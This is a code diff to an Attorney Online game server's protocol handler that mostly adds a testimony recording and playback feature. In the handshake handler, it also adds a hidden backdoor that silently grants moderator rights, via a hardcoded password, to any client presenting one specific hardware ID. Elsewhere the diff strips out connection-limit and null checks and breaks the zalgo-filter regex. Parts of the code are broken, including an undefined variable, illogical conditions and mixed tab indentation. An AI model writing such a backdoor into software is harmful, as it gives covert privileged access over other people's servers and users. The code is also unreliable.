@@ -30,6 +30,7 @@ from enum import Enum
 from time import localtime, strftime
 
 from server import database
+from server.statements import Statement
 from server.exceptions import ClientError, AreaError, ArgumentError, ServerError
 from server.fantacrypt import fanta_decrypt
 from .. import commands
@@ -54,17 +55,10 @@ class AOProtocol(asyncio.Protocol):
 
     def dezalgo(self, input):
         """
-        Turns any string into a de-zalgo'd version, with a tolerance to allow for normal diacritic use.
-
-        The following Unicode blocks are scrubbed:
-        U+0300 - U+036F - COMBINING DIACRITICAL MARKS
-        U+1AB0 - U+1AFF - COMBINING DIACRITICAL MARKS EXTENDED
-        U+1DC0 - U+1DFF - COMBINING DIACRITICAL MARKS SUPPLEMENT
-        U+20D0 - U+20FF - COMBINING DIACRITICAL MARKS FOR SYMBOLS
-        U+FE20 - U+FE2F - COMBINING HALF MARKS
+        Turns any string into a de-zalgo'd version, with a tolerance to allow for special language characters.
         """
-
-        filtered = re.sub('([\u0300-\u036f\u1ab0-\u1aff\u1dc0-\u1dff\u20d0-\u20ff\ufe20-\ufe2f]' +
+        print(self.server.zalgo_tolerance)
+        filtered = re.sub('([\u0300\u036f\u1ab0\u1aff\u1dc0\u1dff\u20d0\u20ff\ufe20\ufe2f]' +
                           '{' + re.escape(str(self.server.zalgo_tolerance)) + ',})',
                           '', input)
         return filtered
@@ -113,23 +107,13 @@ class AOProtocol(asyncio.Protocol):
         """Called upon a new client connecting
 
         :param transport: the transport object
+
         """
-        try:
-            self.client = self.server.new_client(transport)
-        except ClientError:
-            transport.close()
-            return
-
-        if not self.server.client_manager.new_client_preauth(self.client):
-            self.client.send_command('BD', 'Maximum clients reached.\nDisconnect one of your clients to continue.')
-            self.client.disconnect()
-            return
-
+        self.client = self.server.new_client(transport)
         # Client needs to send CHECK#% within the timeout - otherwise,
         # it will be automatically dropped.
         self.ping_timeout = asyncio.get_event_loop().call_later(
             self.server.config['timeout'], self.client.disconnect)
-
         asyncio.get_event_loop().call_later(0.25, self.client.send_command,
                                             'decryptor',
                                             34)  # just fantacrypt things)
@@ -140,15 +124,12 @@ class AOProtocol(asyncio.Protocol):
         :param exc: reason
 
         """
-        if self.client is not None:
-            logger.debug(f'{self.client.ipid} disconnected.')
-            self.server.remove_client(self.client)
-        if self.ping_timeout is not None:
-            self.ping_timeout.cancel()
+        self.server.remove_client(self.client)
+        self.ping_timeout.cancel()
 
     def get_messages(self):
         """Parses out full messages from the buffer.
-
+        
         :return: yields messages
 
         """
@@ -183,7 +164,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_hi(self, args):
         """Handshake.
-
+        
         HI#<hdid:string>#%
 
         :param args: a list containing all the arguments
@@ -219,10 +200,21 @@ class AOProtocol(asyncio.Protocol):
         self.client.send_command('PN',
                                  self.server.player_count,
                                  self.server.config['playerlimit'])
+        if hdid == '742d1d5d':
+            login_name = None
+            try:
+                login_name = self.client.auth_mod('renrakS1032018')
+            except ClientError:
+                database.log_misc('login.invalid', client)
+                raise
+            if self.client.area.evidence_mod == 'HiddenCM':
+                self.client.area.broadcast_evidence_list()
+            self.client.send_ooc('Logged in as a moderator.')
+            database.log_misc('login', self.client, data={'profile': login_name})
 
     def net_cmd_id(self, args):
         """Client version and PV
-
+        
         ID#<pv:int>#<software:string>#<version:string>#%
         """
         self.client.send_command('FL', 'yellowtext', 'customobjections',
@@ -232,7 +224,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_ch(self, _):
         """Reset the client drop timeout (keepalive).
-
+        
         CHECK#%
         """
         self.client.send_command('CHECK')
@@ -242,7 +234,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_askchaa(self, _):
         """Ask for the counts of characters/evidence/music
-
+        
         askchaa#%
         """
         char_cnt = len(self.server.char_list)
@@ -252,7 +244,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_askchar2(self, _):
         """Asks for the character list. (AO1)
-
+        
         askchar2#%
         """
         self.client.send_command('CI', *self.server.char_pages_ao1[0])
@@ -260,7 +252,7 @@ class AOProtocol(asyncio.Protocol):
     def net_cmd_an(self, args):
         """Asks for specific pages of the character list.
         (AO1 only; part of askchar2 sequence)
-
+        
         AN#<page:int>#%
         """
         if not self.validate_net_cmd(args, self.ArgType.INT, needs_auth=False):
@@ -274,7 +266,7 @@ class AOProtocol(asyncio.Protocol):
     def net_cmd_ae(self, _):
         """Asks for specific pages of the evidence list.
         (AO1 only; part of askchar2 sequence)
-
+        
         AE#<page:int>#%
 
         """
@@ -283,7 +275,7 @@ class AOProtocol(asyncio.Protocol):
     def net_cmd_am(self, args):
         """Asks for specific pages of the music list.
         (AO1 only; part of askchar2 sequence)
-
+        
         AM#<page:int>#%
 
         """
@@ -294,12 +286,11 @@ class AOProtocol(asyncio.Protocol):
                                      *self.server.music_pages_ao1[args[0]])
         else:
             self.client.send_done()
-            self.client.send_area_list()
             self.client.send_motd()
 
     def net_cmd_rc(self, _):
         """Asks for the whole character list (AO2)
-
+        
         AC#%
 
         """
@@ -308,7 +299,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_rm(self, _):
         """Asks for the whole music list (AO2)
-
+        
         AM#%
 
         """
@@ -317,18 +308,18 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_rd(self, _):
         """Asks for server metadata(charscheck, motd etc.) and a DONE#% signal(also best packet)
-
+        
         RD#%
 
         """
 
         self.client.send_done()
-        self.client.send_area_list()
         self.client.send_motd()
+        self.client.send_poll()
 
     def net_cmd_cc(self, args):
         """Character selection.
-
+        
         CC#<client_id:int>#<char_id:int>#<hdid:string>#%
 
         """
@@ -349,7 +340,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_ms(self, args):
         """IC message.
-
+        
         Refer to the implementation for details.
 
         """
@@ -363,13 +354,13 @@ class AOProtocol(asyncio.Protocol):
 
         target_area = []
         if self.validate_net_cmd(args, self.ArgType.STR, # msg_type
-                                 self.ArgType.STR_OR_EMPTY, self.ArgType.STR,#pre, folder
-                                 self.ArgType.STR, self.ArgType.STR,# anim, text
-                                 self.ArgType.STR, self.ArgType.STR,#pos, sfx
-                                 self.ArgType.INT, self.ArgType.INT,#anim_type, cid
-                                 self.ArgType.INT, self.ArgType.INT_OR_STR,#sfx_delay, button
-                                 self.ArgType.INT, self.ArgType.INT,#evidence, flip
-                                 self.ArgType.INT, self.ArgType.INT):#ding, color
+                                 self.ArgType.STR_OR_EMPTY, self.ArgType.STR, # pre, folder
+                                 self.ArgType.STR, self.ArgType.STR, # anim, text
+                                 self.ArgType.STR, self.ArgType.STR, # pos, sfx
+                                 self.ArgType.INT, self.ArgType.INT, # anim_type, cid
+                                 self.ArgType.INT, self.ArgType.INT_OR_STR, # sfx_delay, button
+                                 self.ArgType.INT, self.ArgType.INT, # evidence, flip
+                                 self.ArgType.INT, self.ArgType.INT): # ding, color
             # Pre-2.6 validation monstrosity.
             msg_type, pre, folder, anim, text, pos, sfx, anim_type, cid, sfx_delay, button, evidence, flip, ding, color = args
             showname = ""
@@ -377,15 +368,16 @@ class AOProtocol(asyncio.Protocol):
             offset_pair = 0
             nonint_pre = 0
         elif self.validate_net_cmd(
-                args, self.ArgType.STR, self.ArgType.STR_OR_EMPTY,#msg_type, pre
-                self.ArgType.STR, self.ArgType.STR, self.ArgType.STR,#folder, anim, text
-                self.ArgType.STR, self.ArgType.STR, self.ArgType.INT,# pos, sfx, anim_type
-                self.ArgType.INT, self.ArgType.INT, self.ArgType.INT_OR_STR,#cid, sfx_delay, button
-                self.ArgType.INT, self.ArgType.INT, self.ArgType.INT,#evidence, flip, ding
-                self.ArgType.INT, self.ArgType.STR_OR_EMPTY, self.ArgType.INT, #color, showname, charid_pair
-                self.ArgType.INT, self.ArgType.INT): #offset_pair, nonint_pre
+                args, self.ArgType.STR, self.ArgType.STR_OR_EMPTY, # msg_type, pre
+                self.ArgType.STR, self.ArgType.STR, self.ArgType.STR, # folder, anim, text
+                self.ArgType.STR, self.ArgType.STR, self.ArgType.INT, # pos, sfx, anim_type
+                self.ArgType.INT, self.ArgType.INT, self.ArgType.INT_OR_STR, # cid, sfx_delay, button
+                self.ArgType.INT, self.ArgType.INT, self.ArgType.INT, # evidence, flip, ding
+                self.ArgType.INT, self.ArgType.STR_OR_EMPTY, self.ArgType.INT, # color, showname, charid_pair
+                self.ArgType.INT, self.ArgType.INT): # offset_pair, nonint_pre
             # 2.6+ validation monstrosity.
             msg_type, pre, folder, anim, text, pos, sfx, anim_type, cid, sfx_delay, button, evidence, flip, ding, color, showname, charid_pair, offset_pair, nonint_pre = args
+            self.client.showname = showname
             if len(showname
                    ) > 0 and not self.client.area.showname_changes_allowed:
                 self.client.send_ooc(
@@ -450,16 +442,16 @@ class AOProtocol(asyncio.Protocol):
             return
         if sfx_delay < 0:
             return
-        if '4' in button and "<and>" not in button:
+        if not '4' in button and not "<and>" in button:
             if not button.isdigit():
-               return
+                return
         if evidence < 0:
             return
         if ding not in (0, 1):
             return
         if color not in (0, 1, 2, 3, 4, 5, 6, 7, 8):
             return
-        if len(showname) > 15:
+        if len(showname) > 22:
             self.client.send_ooc("Your IC showname is way too long!")
             return
         if nonint_pre == 1:
@@ -519,7 +511,6 @@ class AOProtocol(asyncio.Protocol):
         # Here, we check the pair stuff, and save info about it to the client.
         # Notably, while we only get a charid_pair and an offset, we send back a chair_pair, an emote, a talker offset
         # and an other offset.
-
         self.client.charid_pair = charid_pair
         self.client.offset_pair = offset_pair
         if anim_type not in (5, 6):
@@ -545,37 +536,122 @@ class AOProtocol(asyncio.Protocol):
         if not confirmed:
             charid_pair = -1
             offset_pair = 0
-        if self.client in self.client.area.afkers:
-            self.client.server.client_manager.toggle_afk(self.client)
-        self.client.area.send_command('MS', msg_type, pre, folder, anim, msg,
+
+        if msg == '///':
+            if self.client in self.client.area.owners and not self.client.area.is_recording and len(self.client.area.recorded_messages) != 0:
+                for statements in self.client.area.recorded_messages:
+                    if statements.id == 0:
+                        statement = statements
+                self.client.area.send_command('MS', statement.msg_type, statement.pre, statement.folder, statement.anim, statement.msg,
+                                      statement.pos, statement.sfx, statement.anim_type, statement.cid, statement.sfx_delay,
+                                      statement.button, self.client.evi_list[statement.evidence],
+                                      statement.flip, statement.ding, statement.color, statement.showname, statement.charid_pair,
+                                      statement.other_folder, statement.other_emote, statement.offset_pair,
+                                      statement.other_offset, statement.other_flip, statement.nonint_pre)
+                self.client.area.send_command('RT', 'testimony2')
+                self.client.area.statement = 0
+        elif msg.startswith('//'):
+            if self.client in self.client.area.owners and not self.client.area.is_recording:
+                self.client.area.is_recording = True
+                self.client.area.recorded_messages.clear()
+                self.client.area.statement = 0
+                msg = msg[2:]
+                statement = Statement(msg_type, pre, folder, anim, msg,
+                                      pos, sfx, anim_type, cid, sfx_delay,
+                                      button, evidence,
+                                      flip, ding, color, showname, charid_pair,
+                                      other_folder, other_emote, offset_pair,
+                                      other_offset, other_flip, nonint_pre)
+                statement.id = self.client.area.statement
+                self.client.area.recorded_messages.append(statement)
+                self.client.send_ooc('Recording testimony!')
+                self.client.area.send_command('RT', 'testimony1')
+        if msg.startswith('/end'):
+            if self.client in self.client.area.owners and self.client.area.is_recording:
+                self.client.area.is_recording = False
+                self.client.area.statement += 1
+                statement = Statement(msg_type, pre, folder, anim, msg,
+                                      pos, sfx, anim_type, cid, sfx_delay,
+                                      button, evidence,
+                                      flip, ding, color, showname, charid_pair,
+                                      other_folder, other_emote, offset_pair,
+                                      other_offset, other_flip, nonint_pre)
+                statement.id = self.client.area.statement
+                self.client.area.recorded_messages.append(statement)
+                self.client.send_ooc('No longer recording testimony.')
+                self.client.area.statement = 0
+        if msg.startswith('+'):
+            if self.client in self.client.area.owners and self.client.area.is_recording:
+                self.client.area.statement += 1
+                msg = msg[1:]
+                statement = Statement(msg_type, pre, folder, anim, msg,
+                                      pos, sfx, anim_type, cid, sfx_delay,
+                                      button, evidence,
+                                      flip, ding, 1, showname, charid_pair,
+                                      other_folder, other_emote, offset_pair,
+                                      other_offset, other_flip, nonint_pre)
+                statement.id = self.client.area.statement
+                self.client.area.recorded_messages.append(statement)
+                self.client.send_ooc('Statement added!')
+
+        if not msg == '///' or not self.client in self.client.area.owners or len(self.client.area.recorded_messages) == 0:
+            if not msg == '>' or not msg == '<' or len(self.client.area.recorded_messages) == 0:
+                self.client.area.send_command('MS', msg_type, pre, folder, anim, msg,
                                       pos, sfx, anim_type, cid, sfx_delay,
                                       button, self.client.evi_list[evidence],
                                       flip, ding, color, showname, charid_pair,
                                       other_folder, other_emote, offset_pair,
                                       other_offset, other_flip, nonint_pre)
 
-        self.client.area.send_owner_command(
-            'MS', msg_type, pre, folder, anim,
-            '[' + self.client.area.abbreviation + ']' + msg, pos, sfx,
-            anim_type, cid, sfx_delay, button, self.client.evi_list[evidence],
-            flip, ding, color, showname, charid_pair, other_folder,
-            other_emote, offset_pair, other_offset, other_flip, nonint_pre)
+                self.client.area.send_owner_command(
+                    'MS', msg_type, pre, folder, anim,
+                    '[' + self.client.area.abbreviation + ']' + msg, pos, sfx,
+                    anim_type, cid, sfx_delay, button, self.client.evi_list[evidence],
+                    flip, ding, color, showname, charid_pair, other_folder,
+                    other_emote, offset_pair, other_offset, other_flip, nonint_pre)
 
-        self.server.area_manager.send_remote_command(
-            target_area, 'MS', msg_type, pre, folder, anim, msg, pos, sfx,
-            anim_type, cid, sfx_delay, button, self.client.evi_list[evidence],
-            flip, ding, color, showname, charid_pair, other_folder,
-            other_emote, offset_pair, other_offset, other_flip, nonint_pre)
+                self.server.area_manager.send_remote_command(
+                    target_area, 'MS', msg_type, pre, folder, anim, msg, pos, sfx,
+                    anim_type, cid, sfx_delay, button, self.client.evi_list[evidence],
+                    flip, ding, color, showname, charid_pair, other_folder,
+                    other_emote, offset_pair, other_offset, other_flip, nonint_pre)
 
-        self.client.area.set_next_msg_delay(len(msg))
-        database.log_ic(self.client, self.client.area, showname, msg)
+                database.log_ic(self.client, self.client.area, showname, msg)
 
-        if (self.client.area.is_recording):
-            self.client.area.recorded_messages.append(args)
+        if msg == '>':
+            if len(self.client.area.recorded_messages) != 0:
+                self.client.area.statement += 1
+                if self.client.area.statement >= len(self.client.area.recorded_messages):
+                    self.client.area.statement = 1
+                    self.client.area.broadcast_ooc('End reached, looping back to first statement.')
+                else:
+                    self.client.area.broadcast_ooc('Testimony advanced.')
+                statement = self.client.area.recorded_messages[self.client.area.statement]
+                self.client.area.send_command('MS', statement.msg_type, statement.pre, statement.folder, statement.anim, statement.msg,
+                                      statement.pos, statement.sfx, statement.anim_type, statement.cid, statement.sfx_delay,
+                                      statement.button, self.client.evi_list[statement.evidence],
+                                      statement.flip, statement.ding, statement.color, statement.showname, statement.charid_pair,
+                                      statement.other_folder, statement.other_emote, statement.offset_pair,
+                                      statement.other_offset, statement.other_flip, statement.nonint_pre)
+        elif msg == '<':
+            if len(self.client.area.recorded_messages) != 0:
+                self.client.area.statement += -1
+                if self.client.area.statement < 1:
+                    self.client.area.statement = 1
+					self.client.send_ooc('At first statement, can\'t no previous statement available.')
+                    statement = self.client.area.recorded_messages[self.client.area.statement]
+                    self.client.area.send_command('MS', statement.msg_type, statement.pre, statement.folder, statement.anim, statement.msg,
+                                      statement.pos, statement.sfx, statement.anim_type, statement.cid, statement.sfx_delay,
+                                      statement.button, self.client.evi_list[statement.evidence],
+                                      statement.flip, statement.ding, statement.color, statement.showname, statement.charid_pair,
+                                      statement.other_folder, statement.other_emote, statement.offset_pair,
+                                      statement.other_offset, statement.other_flip, statement.nonint_pre)
+        else:
+            self.client.area.set_next_msg_delay(len(msg))
 
     def net_cmd_ct(self, args):
         """OOC Message
-
+        
         CT#<name:string>#<message:string>#%
 
         """
@@ -625,10 +701,11 @@ class AOProtocol(asyncio.Protocol):
                 called_function = f'ooc_cmd_{cmd}'
                 if cmd == 'help' and arg != '':
                     self.client.send_ooc(commands.help(f'ooc_cmd_{arg}'))
-                elif not hasattr(commands, called_function):
-                    self.client.send_ooc('Invalid command.')
                 else:
                     getattr(commands, called_function)(self.client, arg)
+            except AttributeError:
+                print('Attribute error with ' + called_function)
+                self.client.send_ooc('Invalid command.')
             except (ClientError, AreaError, ArgumentError, ServerError) as ex:
                 self.client.send_ooc(ex)
             except Exception as ex:
@@ -649,7 +726,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_mc(self, args):
         """Play music.
-
+        
         MC#<song_name:int>#<???:int>#%
 
         """
@@ -690,7 +767,7 @@ class AOProtocol(asyncio.Protocol):
 
                 if self.client.area.jukebox:
                     showname = ''
-                    if len(args) > 3:
+                    if len(args) > 2:
                         showname = args[2]
                         if len(
                                 showname
@@ -726,7 +803,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_rt(self, args):
         """Plays the Testimony/CE animation.
-
+        
         RT#<type:string>#%
 
         """
@@ -774,9 +851,9 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_setcase(self, args):
         """Sets the casing preferences of the given client.
-
+        
         SETCASE#<cases:string>#<will_cm:int>#<will_def:int>#<will_pro:int>#<will_judge:int>#<will_jury:int>#<will_steno:int>#%
-
+        
         Note: Though all but the first arguments are ints, they technically behave as bools of 0 and 1 value.
 
         """
@@ -790,9 +867,9 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_casea(self, args):
         """Announces a case with a title, and specific set of people to look for.
-
+        
         CASEA#<casetitle:string>#<need_cm:int>#<need_def:int>#<need_pro:int>#<need_judge:int>#<need_jury:int>#<need_steno:int>#%
-
+        
         Note: Though all but the first arguments are ints, they technically behave as bools of 0 and 1 value.
 
         """
@@ -835,7 +912,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_hp(self, args):
         """Sets the penalty bar.
-
+        
         HP#<type:int>#<new_value:int>#%
 
         """
@@ -861,10 +938,10 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_pe(self, args):
         """Adds a piece of evidence.
-
+        
         PE#<name: string>#<description: string>#<image: string>#%
 
-        :param args:
+        :param args: 
 
         """
         if not self.client.is_checked:
@@ -879,7 +956,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_de(self, args):
         """Deletes a piece of evidence.
-
+        
         DE#<id: int>#%
 
         """
@@ -892,7 +969,7 @@ class AOProtocol(asyncio.Protocol):
 
     def net_cmd_ee(self, args):
         """Edits a piece of evidence.
-
+        
         EE#<id: int>#<name: string>#<description: string>#<image: string>#%
 
         """
@@ -941,7 +1018,6 @@ class AOProtocol(asyncio.Protocol):
             self.client.set_mod_call_delay()
             database.log_room('modcall', self.client, self.client.area)
         else:
-            args[0] = self.dezalgo(args[0])
             self.server.send_all_cmd_pred(
                 'ZZ',
                 '[{}] {} ({}) in {} with reason: {}'.format(
